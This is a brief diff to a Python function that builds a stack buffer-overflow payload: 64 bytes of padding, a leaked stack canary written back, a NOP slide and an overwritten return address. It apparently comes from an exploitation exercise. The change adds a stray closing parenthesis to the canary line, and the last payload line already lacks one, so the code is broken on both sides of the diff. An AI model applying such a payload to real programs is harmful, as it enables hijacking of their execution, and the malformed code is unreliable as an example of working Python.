@@ -25,7 +25,7 @@ def create_dynamic_payload(canary, deadcode_address):
     buffer_size = 64
     nop_slide = b"\x90" * 16
     payload = b"A" * buffer_size
-    payload += struct.pack("<I", canary)  # preserving the canary
+    payload += struct.pack("<I", canary))  # preserving the canary
     payload += nop_slide
     payload += struct.pack("<I", (deadcode_address)  # jumping to return address
     return payload
